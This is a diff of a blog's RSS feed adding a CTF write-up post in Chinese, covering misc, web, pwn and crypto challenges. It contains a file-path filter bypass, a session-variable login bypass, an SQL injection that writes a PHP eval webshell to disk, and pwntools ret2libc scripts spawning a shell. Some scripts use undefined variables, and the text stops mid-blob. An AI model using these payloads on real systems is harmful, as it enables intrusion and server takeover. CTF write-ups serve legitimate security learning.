@@ -5,23 +5,249 @@
         <link>http://example.com</link>
         <description>欢迎来到Huan的笔记空间~这里主要会记录pwn笔记🌸</description>
         <language>zh-CN</language>
-        <pubDate>Tue, 24 Oct 2023 09:31:05 +0800</pubDate>
-        <lastBuildDate>Tue, 24 Oct 2023 09:31:05 +0800</lastBuildDate>
+        <pubDate>Wed, 15 Nov 2023 08:01:08 +0800</pubDate>
+        <lastBuildDate>Wed, 15 Nov 2023 08:01:08 +0800</lastBuildDate>
         <category>wp</category>
+        <category>canary</category>
+        <category>堆</category>
         <category>csu</category>
         <category>rop</category>
         <category>gdb</category>
-        <category>pie</category>
-        <category>canary</category>
-        <category>格式化字符串漏洞</category>
-        <category>堆</category>
-        <category>格式化字符串</category>
-        <category>got表</category>
         <category>uaf</category>
         <category>srop</category>
         <category>unlink</category>
         <category>got改写</category>
+        <category>pie</category>
         <category>随机数检查</category>
+        <category>格式化字符串</category>
+        <category>got表</category>
+        <category>格式化字符串漏洞</category>
+        <item>
+            <guid isPermalink="true">http://example.com/2023/11/15/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81/</guid>
+            <title>技能兴鲁</title>
+            <link>http://example.com/2023/11/15/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81/</link>
+            <category>wp</category>
+            <pubDate>Wed, 15 Nov 2023 08:01:08 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;技能兴鲁&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#技能兴鲁&#34;&gt;#&lt;/a&gt; 技能兴鲁&lt;/h1&gt;
+&lt;p&gt;最终排名 15 名&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/1png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;misc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#misc&#34;&gt;#&lt;/a&gt; &lt;strong&gt;Misc&lt;/strong&gt;&lt;/h2&gt;
+&lt;h3 id=&#34;datas_secret&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#datas_secret&#34;&gt;#&lt;/a&gt; Datas_secret&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&#34;language-Python&#34;&gt; python2 vol.py -f image.vmem --profile=Win7SP1x64 filescan|grep flag
+ python2 vol.py -f image.vmem --profile=Win7SP1x64 dumpfiles -Q 0x0000000007a09f20 -D  ./
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p 23030d1c2aa90debdf7757782e9f1ee9=&#34;&#34;&gt;flag&lt;/p&gt;
+&lt;h3 id=&#34;卑劣的手段&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#卑劣的手段&#34;&gt;#&lt;/a&gt; 卑劣的手段&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&#34;language-Bash&#34;&gt;python2 vol.py -f image1.vmem --profile=WinXPSP1x64 filescan | grep png
+ python2 vol.py -f image1.vmem --profile=Win7SP1x64 dumpfiles -Q 0x0000000002d44eb0 -D  ./
+zsteg chuyin.png
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;flag{Hat3une_M1ku}rI$&lt;/p&gt;
+&lt;h3 id=&#34;时间不多了&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#时间不多了&#34;&gt;#&lt;/a&gt; 时间不多了&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&#34;language-Python&#34;&gt;import os
+from pyzbar.pyzbar import decode
+from PIL import Image
+
+def scan_qrcodes(folder_path):
+    # 检查文件夹中的所有文件
+    for filename in os.listdir(folder_path):
+        if filename.endswith((&#39;.png&#39;, &#39;.jpg&#39;, &#39;.jpeg&#39;, &#39;.gif&#39;, &#39;.bmp&#39;)):
+            # 拼接完整的文件路径
+            file_path = os.path.join(folder_path, filename)
+            # 打开图像文件
+            image = Image.open(file_path)
+            # 解码图像中的二维码
+            decoded_objects = decode(image)
+            # 打印所有解码出的二维码内容
+            for obj in decoded_objects:
+                print(f&amp;quot;文件 &amp;#123;filename&amp;#125; 中的二维码内容: &amp;#123;obj.data.decode(&#39;utf-8&#39;)&amp;#125;&amp;quot;)
+
+# 使用示例
+folder_path = &#39;./attachment&#39;
+scan_qrcodes(folder_path)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;扫描二维码得到 base64&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;MiAzIDQgOSAxNSAxNyAxOCAyMyAzMA==
+NiAxMyAyMCAyNyAyOA==
+MiAxNSAyMiAxNyAyNCAxNg==
+NiA1IDQgMTEgMTggMjUgMjYgMjcgMjggMjAgMjE=
+MiAzIDkgMTUgMjMgMzAgMzE=
+NSAxMyAyMCAyNyAxNCAyMQ==
+NiAxOSAyNiAyMSAyOCAyMA==
+OSAxMCAxMSAxNyAyNCAzMQ==
+MSAyIDMgOCAxNSAxNiAxNyAyMiAyOSAzMA==
+MiAzIDkgMTYgMTcgMjQgMzAgMzE=
+MiA4IDE1IDIzIDI0IDE4IDExIDM=
+MSAyIDkgMTcgMjMgMzAgMjk=
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;base64 解码得到&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/2.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;之后根据日历表。画图，得到 flag&lt;/p&gt;
+&lt;p&gt;画图就像这样：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/3.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/4.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/5.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;拼起来得到 flag&lt;/p&gt;
+&lt;p DATESO=&#34;&#34;&gt;flag&lt;/p&gt;
+&lt;h2 id=&#34;web&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#web&#34;&gt;#&lt;/a&gt; &lt;strong&gt;Web&lt;/strong&gt;&lt;/h2&gt;
+&lt;h3 id=&#34;日志里的flag&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#日志里的flag&#34;&gt;#&lt;/a&gt; &lt;strong&gt;日志里的 FLAG&lt;/strong&gt;&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&#34;language-Java&#34;&gt;  &amp;lt;?php
+    highlight_file(__FILE__);
+    print(&amp;quot;FLAG就存在于日志文件里哦！&amp;quot;);
+    if (isset($_GET[&#39;path&#39;])) &amp;#123;
+        $path = $_GET[&#39;path&#39;];
+        if (preg_match(&#39;/flag|\$|[&amp;quot;\&#39;]/i&#39;, $path)) &amp;#123;
+            echo &amp;quot;错误&amp;quot;;
+        &amp;#125; else &amp;#123;
+            $path = str_replace(&amp;quot;log&amp;quot;,&amp;quot;&amp;quot;, $path);
+            if (file_exists($path)) &amp;#123;
+                $content = file_get_contents($path);
+                echo highlight_string($content, true);
+            &amp;#125; else &amp;#123;
+                echo &amp;quot;文件不存在&amp;quot;;
+            &amp;#125;
+        &amp;#125;
+    &amp;#125; else &amp;#123;
+        echo &amp;quot;请提供文件路径&amp;quot;;
+    &amp;#125;
+FLAG就存在于日志文件里哦！请提供文件路径
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;双写绕过检查&lt;/p&gt;
+&lt;p&gt;payload&lt;/p&gt;
+&lt;p&gt;path=/var/lologg/nginx/access.lologg&lt;/p&gt;
+&lt;h3 id=&#34;购买flag&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#购买flag&#34;&gt;#&lt;/a&gt; &lt;strong&gt;购买 flag&lt;/strong&gt;&lt;/h3&gt;
+&lt;p&gt;登陆之后&lt;/p&gt;
+&lt;p&gt;进入花费界面&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/6.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;将 - 100 改为 + 100000000，发包，来回几次&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/7.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;在购买 flag，在控制台看到 flag&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/8.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;一只小蜜蜂&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一只小蜜蜂&#34;&gt;#&lt;/a&gt; &lt;strong&gt;一只小蜜蜂&lt;/strong&gt;&lt;/h3&gt;
+&lt;p&gt;参考文章 https://blog.csdn.net/qq_43573676/article/details/105627370&lt;/p&gt;
+&lt;p&gt;在主页面进行 post 传参&lt;/p&gt;
+&lt;p&gt;_SESSION[login_in]=1&amp;amp;_SESSION[admin]=1&amp;amp;_SESSION[login_time]=99999999999&lt;/p&gt;
+&lt;p&gt;之后访问 url/admin/login.php&lt;/p&gt;
+&lt;p&gt;便会自动进入后台管理界面&lt;/p&gt;
+&lt;p&gt;之后退出登录&lt;/p&gt;
+&lt;p&gt;进入到后台登录界面&lt;/p&gt;
+&lt;p&gt;在登录界面存在 sql 注入漏洞&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-HTML&#34;&gt;user=admin&#39; un union ion selselectect 1,0x3c3f70687020406576616c28245f524551554553545b27414243275d293b3f3e,3,4,5 i into nto outoutfilefile
+&#39;/var/www/html/123.php&#39;#&amp;amp;password=12&amp;amp;code=f333&amp;amp;submit=true&amp;amp;submit.x=49&amp;amp;submit.y=30
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;之后访问 123.php&lt;/p&gt;
+&lt;p&gt;成功写马，&lt;/p&gt;
+&lt;p&gt;蚁剑链接，得到 flag&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/9.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/10.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p 27e81dee3a91e5e39bd633147fa39f1c=&#34;&#34;&gt;flag&lt;/p&gt;
+&lt;h2 id=&#34;pwn&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pwn&#34;&gt;#&lt;/a&gt; pwn&lt;/h2&gt;
+&lt;h3 id=&#34;pwn1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pwn1&#34;&gt;#&lt;/a&gt; pwn1&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&#34;language-PHP&#34;&gt;from pwn import *
+io = remote(&#39;vt.jnxl2023.sierting.com&#39;,32299)
+# io = process(&amp;quot;./pwn&amp;quot;)
+
+context.log_level = &amp;quot;debug&amp;quot;
+
+r.sendlineafter(&amp;quot;2.change\n&amp;quot;, &amp;quot;1&amp;quot;)
+r.sendlineafter(&amp;quot;name: &amp;quot;, &amp;quot;abf1ag&amp;quot;)
+r.sendlineafter(&amp;quot;age: &amp;quot;, &amp;quot;18&amp;quot;)
+r.sendlineafter(&amp;quot;address: &amp;quot;, &amp;quot;aaaa&amp;quot;)
+r.sendlineafter(&amp;quot;2.change\n&amp;quot;, &amp;quot;2&amp;quot;)
+r.sendlineafter(&amp;quot;id: &amp;quot;, &amp;quot;0&amp;quot;)
+r.sendlineafter(&amp;quot;address: &amp;quot;, &amp;quot;aaaa&amp;quot;)
+r.sendafter(&amp;quot;check name: &amp;quot;, b&amp;quot;a&amp;quot; * 0x358 + p64(0x4025EF) + p64(0x4025D6) + b&amp;quot;\n&amp;quot;)
+r.interactive()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;pwn2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pwn2&#34;&gt;#&lt;/a&gt; pwn2&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&#34;language-PHP&#34;&gt;from pwn import *
+from LibcSearcher import *
+
+context.log_level = &#39;debug&#39;
+
+r = remote(&#39;vt.jnxl2023.sierting.com&#39;,30629)
+
+# p = process(&#39;./pwn&#39;)
+
+elf = ELF(&#39;./pwn&#39;)
+libc = ELF(&#39;libc.so.6&#39;)
+
+got_addr = elf.got[&#39;puts&#39;]
+plt_addr = elf.plt[&#39;puts&#39;]
+main_addr = elf.symbols[&#39;main&#39;]
+pop_rdi = 0x4011e3
+pop_rsi_r15 = 0x4006e1
+ret_addr = 0x40101a
+
+payload = (0x10+8)*b&#39;a&#39; + p64(pop_rdi) + p64(got_addr) + p64(plt_addr) + p64(main_addr)
+r.sendline(payload)
+
+puts_addr=u64(p.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8, b&amp;quot;\x00&amp;quot;)
+
+libc_base = puts_addr - libc.sym[&#39;puts&#39;]
+system_addr = libc_base + libc.sym[&#39;system&#39;]
+binsh_addr = libc_base +  next(libc.search(b&amp;quot;/bin/sh\x00&amp;quot;))
+
+pl = (0x10+8)*b&#39;a&#39; + p64(ret_addr) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
+r.sendline(pl)
+
+r.interactive()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;crypto&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#crypto&#34;&gt;#&lt;/a&gt; Crypto&lt;/h2&gt;
+&lt;h3 id=&#34;easyrsa&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#easyrsa&#34;&gt;#&lt;/a&gt; EasyRSA&lt;/h3&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/11.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;babyrsa&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#babyrsa&#34;&gt;#&lt;/a&gt; BabyRSA&lt;/h3&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/12.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;简单的python&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#简单的python&#34;&gt;#&lt;/a&gt; 简单的 Python&lt;/h3&gt;
+&lt;p&gt;解 base100&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-Bash&#34;&gt;Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSV01WbDNXa1JTVjAxV2JETlhhMUpUVmpBeFYySkVUbGhoTVVwVVZtcEJlRll5U2tWVWJHaG9UVlZ3VlZacVFtRlRNbEpJVm10a1dHSkdjRTlaVjNSR1pVWmFkR05GU214U2JHdzFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1pFWlNUbFpVVmtwV2JURXdWakZXZEZOc1dsaGlSMmhZV1d4b2IyVnNVbFZTYlVacVZtdGFNRlZ0ZUZOVWJVcEdZMFZ3VjJKVVJYZFpWRVpyVTBaT2NscEhjRlJTVlhCWlYxWlNSMlF5UmtkalJtUllZbFZhY2xWc1VrZFdiRnBZWlVaT1ZXSlZXVEpWYkZKSFZqSkZlVlZZWkZwbGEzQklXWHBHVDJSV1ZuUmhSazVzWWxob1dGWnRNSGRsUjBsNFUydGtXR0pIVWxsWmJGWmhZMVphZEdSSFJrNVNiRm93V2xWYVQxWlhTbFpYVkVwV1lrWktTRlpxUm1GU2JVbDZXa1prYUdFeGNHOVdha0poVkRKT2RGSnJhR2hTYXpWeldXeG9iMWRHV25STldHUlZUVlpHTTFSVmFHOWhiRXB6WTBac1dtSkdXbWhaTW5oWFkxWkdWVkpzVGs1V01VbzFWbXBLTkZReFdsaFRiRnBxVWxkU1lWUlZXbUZOTVZweFUydDBWMVpyY0ZwWGExcHJZVWRGZUdOR2JGaGhNVnBvVmtSS1RtVkdjRWxVYldoVFRXNW9WVmRXVWs5Uk1XUnpWMWhvV0dKWVVrOVZha1pIVGxaYVdFNVZPV2hpUlhBd1ZsZDRjMWR0U2tkWGJXaGFUVzVvV0ZreFdrdGtSa3B6Vld4T2FWSXpZM2hXYTFwaFZURlZlRmR1U2s1WFJYQnhWV3hrTkdGR1ZYZGhSVTVUVW14d2VGVXlkR3RoYlVwV1ZtcGFXbFpXY0doWlZXUkdaVWRPU0U5V1pHaGhNSEJ2Vm10U1MxUXlVa2RUYmtwb1VqSm9WRmxZY0ZkbGJHUllaVWM1YVUxWFVraFdNalZUVkd4T1NHRkdRbFppVkVVd1ZtcEdVMVp0UmtoUFZtaFRUVWhDTlZaSGVHRmpNV1IwVTJ0a1dHSlhhR0ZVVnpWdlYwWnJlRmRyWkZkV2EzQjZWa2R6TVZkR1NsWmpSV3hYWWxoQ1RGUnJXbEpsUm1SellVWlNhRTFzU25oV1Z6RTBaREZrUjJKSVRtaFNhelZQVkZaYWQyVkdWWGxrUkVKWFRWWndlVmt3V25kWFIwVjRZMFJPV21FeVVrZGFWM2hIWTIxS1IxcEhiRmhTVlhCS1ZtMTBVMU14VlhoWFdHaFlZbXhhVjFsc1pHOVdSbXhaWTBaa2JHSkhVbGxhVldNMVlWVXhXRlZyYUZkTmFsWlVWa2Q0VDFOSFJrZFJiRnBwVmtWVmQxWnRjRWRWTVZwMFVtdG9VRlp0YUZSVVZXaERUbFphU0dWSFJtcE5WMUl3VlRKMGExZEhTbGhoUjBaVlZucFdkbFl3V25KbFJtUnlXa1prVjJFelFqWldhMlI2VFZaWmQwMVdXbWxsYTFwWVdXeG9RMVJHVW5KWGJFcHNVbTFTZWxsVldsTmhWa3AxVVd4d1YySllVbGhhUkVaYVpVZEtTVk5zYUdoTk1VcFdWbGN4TkdReVZrZFdibEpPVmxkU1YxUlhkSGRXTVd4eVZXMUdXRkl3VmpSWk1HaExWMnhhV0ZWclpHRldWMUpRVlRCVk5WWXhjRWhoUjJoT1UwVktNbFp0TVRCVk1VMTRWVmhzVm1FeVVsVlpiWFIzWWpGV2NWTnRPVmRTYlhoYVdUQmFhMkpIU2toVmJHeGhWbGROTVZsV1ZYaFhSbFp5WVVaa1RtRnNXbFZXYTJRMFlURk9SMVp1VGxoaVJscFlXV3RvUTFOV1drZFZhMlJXVFZad01GVnRkRzlWUmxsNVlVaENWbUpIYUVSVWJYaHJWbFpHZEZKdGNFNVdNVWwzVmxSS01HRXhaRWhUYkdob1VqQmFWbFp1Y0Zka2JGbDNWMjVPVDJKRmNIcFhhMlIzWVZaT1JsTnJiRmROYmxKeVdYcEdWbVZXVG5WVGJGSnBWbFp3V1ZaR1l6RmlNV1JIV2taa1dHSkZjSE5WYlRGVFpXeHNWbGRzVG1oV2EzQXhWVmQ0ZDFZeVNsbFZiR2hoVWtWYVlWcFZaRXRUVms1ellVZG9UazFWY0ZaV2JHTjRUa2RSZVZaclpGZGlSMUp2Vlc1d2MySXhVbGRYYm1Sc1lrWnNOVmt3Vm10V01ERkZVbXBHV2xaWFVuWldNbmhoVjBaV2NscEhSbGRXTVVwUlZsZHdTMUl4U1hsU2EyaHBVbXMxY0ZsVVFuZE5iRnAwVFZSQ1ZrMVZNVFJXVm1oelZtMUZlVlZzV2xwaVdGSXpXVlZhVjJSSFZrWmtSM0JUWWtoQ05GWlVTWGRPVjBwSVUydG9WbUpIZUdoV2JHUk9UVlpzVjFaWWFGaFNiRnA2V1ZWYWExUnNXWGxoUkVwWFRWWndhRlY2UmtwbFJsSjFWbXhLYVZKc2NGbFdSbEpIVXpBMWMxZHJaRlpoTWxKWFZGWmFkMDFHVm5Sa1J6bFdVbXhzTlZsVmFFTldiVXBJWVVWT1lWSkZXbWhaZWtaM1VsWldkR05GTlZkTlZXd3pWbXhTUzAxSFJYaGFSV2hVWWtkb2IxVnFRbUZXYkZwMFpVaGtUazFZUWxsYVZXaExZa1paZUZkcmJHRlNWMUYzVmxSS1JtVnNSbGxhUm1ocFVteHdiMWRXVWt0U01WbDRXa2hXVkdKWGVITlpWRVozVjFaa1dHVkhPVkpOVlRFMFZsZDRhMWxXU2xkalNFNVdZbFJHVkZZeWVHdGpiRnBWVW14a1RsWnVRalpYVkVKaFZqRmtSMWR1VGxSaE1taG9WV3RXWVZsV2NGWmFSWFJVVm1zMWVsbFZaRzlVYXpGV1kwWmFWMkpIVGpSVWEyUlNaVlphY2xwR1pGaFNNMmg1Vmxkd1ExbFhUa2RXYmxKc1UwZFNjMWxyV2xkT1ZuQldZVWQwV0ZJd2NFaFpNRnB2VjJzeFNHRkZlRmRoYTFwb1ZXMTRhMk50VmtkYVJUVlhZbXRLU2xZeFVrcGxSazE0VTFob2FsSlhhSEJWYlRGdlZrWmFjMkZGVGxSTlZuQXdWRlpTUTFack1WWk5WRkpYWWtkb2RsWXdXbXRUUjBaSVlVWmFUbEp1UW05V2JURTBZekpPYzFwSVNtdFNNMEpVV1d0b1EwNUdXbFZUV0dSUFZqQndTVlV5ZEc5V2JVcElaVWRvVjJKSFVrOVVWbHB6VmpGYVdXRkdhRk5pUm5BMlYxWldZV0V4VW5OWFdHeG9Va1Z3V0ZSV1duZGhSbFkyVW10d2JGSnNTakZXUnpGSFZUSktSMk5HYkZoV00xSjJWVlJCTVdNeFpISmhSM1JUVFVad1dWZFhlR0ZaVm1SWFYyeG9hMUo2Ykc5VVZsWnpUbFpzVm1GRlRsZGlWWEJKV1ZWV1QxbFdTa1pYYldoYVpXdGFNMVZzV2xka1IwNUdUbFprVGxaWGQzcFdiWGhUVXpBeFNGTlliRk5oTWxKVldXMXpNVlpXYkhKYVJ6bFhZa1p3ZWxZeU5XdFVhekZYWTBoc1YwMXFSa2haVjNoaFkyMU9SVkZ0UmxOV01VWXpWbXhTUzFKdFZuTlNiR3hoVW0xb2NGVnRlSGRpTVdSWFZXdDBVMDFXYkRSV1J6VlhWbGRLV0dGRk9WVldla1oyVmpGYWExWXhWbkphUjNST1lURndTVlpxU2pSV01WVjVVMnRrYWxORk5WZFpiRkpIVmtaU1YxZHNXbXhXTURReVZXMTRiMVV5UlhwUmJVWlhWbTFSTUZsNlJtdFNNV1IxVld4YVYxSlZjRzlXVjNSWFdWWnNWMk5HV2xoaVdGSnlWbTEwZDJWc1duUk5XRTVYVFZWc05sbFZVbUZXTURGWVZWaGtXRlp0VWxOYVZscGhZMnh3UjFwR2FGTk5NbWcxVm14a2QxUXhWWGxUV0docFUwVTFXRmx0TVZOWFJsSlhWMjVrVGxKdGRETlhhMVpyVjBaSmQyTkZhRnBOUm5CMlZqSnplRk5IUmtabFJtUm9ZVEZ3YjFaWE1UUmhNazUwVm10a1lWSXlhRzlVVkVKTFZXeGFjMVZyWkdoTlZURTBWVEZvYjJGc1NsaFZiV2hXWWxoTmVGWXdXbHBrTVZweVpFVTFhVkp1UVhkV1JscFRVVEZhY2sxV1drNVdSa3BZVm0weGIyVnNXblJOVlZwc1ZteGFlbFp0ZUhkaFZtUkhVMWh3V0ZZelFraFdha3BQVmpGU2RWVnNRbGRpVmtwVlYxZDRiMkl4YkZkYVJsWlNZbFZhYjFSWGRIZFRWbFY1WkVjNVYySlZjRWxhVldSdlZqSktTRlZyT1ZWV2JIQjZWbXBHWVZkWFJrZGhSazVwVW01Qk1WWXhXbGRaVjBWNFZXNVNVMkpyTlZsWmExcGhWMFpzVlZOc1NrNVNiRmt5VlcxME1HRnJNVmxSYTNCWFlsaG9WRmxXV2t0ak1rNUhZa1pvVjAweFNtOVhhMUpDVFZkTmVGcElTbWhTTTJoVVZGVmFkMkZHV25STlNHaFdUVlZzTkZaWE5VOVhSMHBXVjJ4a1ZtSllhRE5VVlZwaFYwVTFWbFJzWkU1aE0wSktWMVpXVjFVeFdsaFRiR3hvVWpKb1dGbHJXbmRWUmxwelYydDBhazFXY0hsVWJGcHJZVmRGZDFkWWNGZGlXR2h4V2tSQmVGWXhVbGxoUmxwWVVqSm9XbGRYTVhwTlZscFhZa2hLWVZKNmJGaFphMXAzWld4WmVVNVhkRlZoZWtaWVdUQm9jMVl3TVhGU2EyaGFWak5vYUZreU1VOVNWa3B6WVVkb1RsZEZTbEpXYlhSclRrWnNXRlJ1VWxWaE1WcFlXV3RrVTFaR1VsVlRiVGxwVFZad2VWWlhkREJWTURGWFlrUlNWMUo2VmxoV2JURkxVbXhPYzJGR1dtbFNhM0JaVm1wR1lWbFdTWGhpUkZwVFlsZDRUMVpxUmt0VFZtUllaRWM1VTAxV2NFbFZiR2h2WVd4T1JrNVdaRnBpUmtwSVZtdGFXbVZYVmtoa1IzQnBVbTVDVjFaWE1UUmlNVlY1VWxod1VtSlZXbGhXYlRGU1RVWndSVkpzY0d4V2F6VjZXV3RhWVdGV1NYbGhSemxYVmpOU1dGZFdaRTlqTVZwMVVteFNhRTB4U2xaV2JURTBVekF4UjJKR1dsaGhlbXh2VldwR1lXVnNXWGxqUjBaWFRVUkdXVlpXYUd0WFJscDBWV3hPWVZac2NHaFpNbmgzVWpGd1IyRkdUazVOYldjeFZtMTRhMDFHV1hoVVdHaGhVbGRTVjFsclpGTlhWbXgwVFZaT2FrMVdjREJhVldoUFZERmFkVkZzWkZwV1YxRjNWakJhU21ReVRrWmhSbkJPVW01Q01sWnFTbnBsUms1SFZtNVdXR0pIVWs5WmJURnZZakZhY1ZGdFJsZE5helY2V1RCV2IxVXlTa2hWYkdoVlZteGFNMVpYZUdGak1YQkpXa1pTVGxaWGR6QldWRVp2WXpGVmVWSlliR2hUUlVwWFdXeG9UbVZHYTNkWGJrNVhWbXRhTVZkclZURmhWa3AxVVZoa1YxSnNjRlJWVkVaaFkyc3hWMWRyTlZkU2EzQlpWbTB3ZUdJeVZuTlhibEpPVmxad2MxWnRlR0ZsYkZsNVpVaGthRlp0VWtoVk1XaDNWMFphYzFkdGFGZGhhM0JVVlRCYVlXTnNaSFJrUms1T1RVVndWbFl4WkRCaU1VVjNUbFZrV0dKR1dsVldNR1JUVlVaYWNWRnVaRlJXYkZZMVdrVmpOVll5U2xaalJXeGhWbGRTZGxacVNrdFRSbFp5VDFaV1YySklRalpXYlhCSFdWWmtXRkpyYUdwU01uaFlWakJXUzFOR1duUmxSM1JQVWpCV05GWlhOVTlYUm1SSVpVYzVWbUV4V2pOV01GcFRWakZrZFZwSGFGTmlSbXQ1VmxjeE1HUXlTa2RUYms1VVlXdGFXRmxzYUc5VVJteFhWMnQwYWsxck5VaFphMXB2VmpBd2VGTnFTbGRXYkVwSVdWUkdXbVZHY0VsVGJXaFRUVEZLVlZaR1ZtRmtNa1pIVjI1U1RsTkhhRmRVVmxVeFYwWlplV1ZIT1doTlZXOHlXV3RqTlZaV1duTlhhazVWVmxad2VsWnRlR3RqTVZKeldrWmthVk5GU21GV01WcFhWakZWZUZkdVNrNVdiVkp4VlRCV2QxZEdiSEpYYm1SVVVtNUNSMVl5ZERCaE1VbDNUbFZrVldKR2NISldSM2hoVjBkUmVtTkdaR2xYUjJoVlZsaHdRbVZHVGtkVGJHeG9VakJhVkZacVNtOVdiR1JZWkVkMGFVMXJiRFJXYlRWVFZHeGFObUpIUmxkaVdHZ3pXbFphWVdSRk1WWmFSbFpvWld0YVdWZFVRbTlqTVZsM1RWaEdVMkV5YUdGV2FrNXZZVVpyZVUxVk9WTldhMW93VlcxNFQxWXdNVlpYV0hCWFlsaG9WRlY2Umt0a1JscDFWR3hPYVZJemFHOVdWekI0WWpKT1IxWnVVbXhUUjFKd1ZGWmtVMWRHV2xoa1JFSldUVVJHV1ZaWGRHOVdhekYxWVVod1dGWnNjRXRhVjNoSFl6RldjMXBIYUdobGJGbDVWbTF3UjFsWFJYaGFSV2hYWVRKb1VWWnRkSGRVTVZwMFpFaGtWRlpzY0hwWFdIQkhWa1V4V0ZWcmJGWk5ibEpvV1ZkNFQxSnJOVmRhUm5CcFVtdHdTVlp0ZEdGa01XUklWbXRzVldKSFVuQlZha1pMVG14YWNsa3phR2xOVmxZMFZqSjBZVmRIUm5OalJtaFhZVEZhZVZwVlduTldWa3B6WTBkNFUySldTbUZYVkVKaFdWZEdWMWRZYkdoU2JXaFpXV3RrVW1ReFpGZFhiazVYVFdzMVNGWXllRzloVmtsNFUyNW9WMUp0VVhkWFZscEtaVVpXV1dGR2FHbFhSa3AzVmxkd1EyUXhaSE5pUmxwV1lsVmFXRlJWVWtkWFZscFhZVWQwV0ZKc2NEQldWM2hQV1ZaYWMyTkhhRnBOYm1nelZXcEdkMU5IU2toaVJrNVlVbFZ3VTFadE1IZGxSVFZJVWxob1YxZEhhRmxaYlhNeFZqRnNjbHBIT1dwaVJsWXpWMnRhVDFZeFNuTlRiR2hYVFdwV1VGWkVSbUZrVmtaeldrWndWMVl4UmpOV2FrSmhVMjFSZVZScldtaFNia0pQVlcwMVEwMXNXbkZUYm5Cc1VtczFTVlZ0ZEdGaVJrcDBWV3M1V21KVVJuWlpha1poWTFaR2RGSnNaRTVoZWxZMlYxUkNWMkl